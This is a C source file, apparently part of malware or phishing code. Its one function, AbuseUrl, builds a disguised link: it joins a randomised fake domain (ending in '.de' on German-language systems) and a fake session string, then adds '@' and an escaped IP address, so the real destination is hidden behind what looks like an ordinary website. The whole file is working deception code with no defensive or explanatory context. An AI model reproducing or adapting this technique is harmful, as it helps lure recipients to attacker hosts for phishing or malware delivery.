   #include "EscapeUrl.h"
   #include "GermanLang.h"

   bool AbuseUrl(char *IPAddress, char *OutputUrl)
   {
       char    EscapedUrl[100];
       char    *FakeSite1[] =  {
                                "instant",
                                "my-",
                                "fast",
                                "users-",
                                "easy"
                               };
       char    *FakeSite2[] =  {
                                "homepage",
                                "website",
                                "page",
                                "site"
                               };
       char    *SuffixEnglish[] = {
                                ".com:",
                                ".net:",
                                ".org:"
                               };
       char    *FakeSession1[] =   {
                                "user",
                                "page",
                                "site",
                                "website",
                                "homepage",
                                "session"
                               };
       char    *FakeSession2[] =   {
                                "_id",
                                "_php_id",
                                "_number"
                               };

       if(lstrcpy(OutputUrl, "http://www.") != 0)
       {
           if(lstrcat(OutputUrl, FakeSite1[RandomNumber(5)]) != 0)
           {
               if(lstrcat(OutputUrl, FakeSite2[RandomNumber(4)]) != 0)
               {
                   if(GermanLang() == true)
                   {
                       if(lstrcat(OutputUrl, ".de:") == 0) return false;
                   }
                   else
                   {
                       if(lstrcat(OutputUrl, SuffixEnglish[RandomNumber(3)]) == 0) return false;
                   }

                   if(lstrcat(OutputUrl, FakeSession1[RandomNumber(6)]) != 0)
                   {
                       if(lstrcat(OutputUrl, FakeSession2[RandomNumber(3)]) != 0)
                       {
                           if(lstrcat(OutputUrl, "@") != 0)
                           {
                               EscapeUrl(IPAddress, EscapedUrl);

                               if(lstrcat(OutputUrl, EscapedUrl) != 0)
                               {
                                   if(lstrcat(OutputUrl, "/") != 0) return true;
                               }
                           }
                       }
                   }
               }
           }
       }

       return false;
   }
